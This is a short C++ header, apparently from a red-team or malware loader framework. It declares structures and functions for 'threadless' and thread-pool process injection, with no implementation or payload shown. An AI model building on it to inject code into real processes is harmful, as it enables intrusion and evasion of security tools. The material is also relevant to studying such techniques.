#ifndef INJECT_HPP
#define INJECT_HPP
#include <core/include/monolith.hpp>
#include <core/include/cipher.hpp>
#include <core/include/names.hpp>
#include <core/include/utils.hpp>
#include <core/include/core.hpp>
#include <loader/resource.hpp>

EXTERN_C VOID Execute();
inline TXT_SECTION(G) BYTE Strings[256] = { };

struct THREADLESS {
    ABUFFER Parent = { };
    ABUFFER Module = { };
    ABUFFER Export = { };
    ABUFFER Loader = { };
    ABUFFER Opcode = { };
};

namespace Injection {

    namespace Threadless {

        DLL_EXPORT VOID Threadless(HMODULE Base);
    }

    namespace Threadpool {}
}
#endif //INJECT_HPP
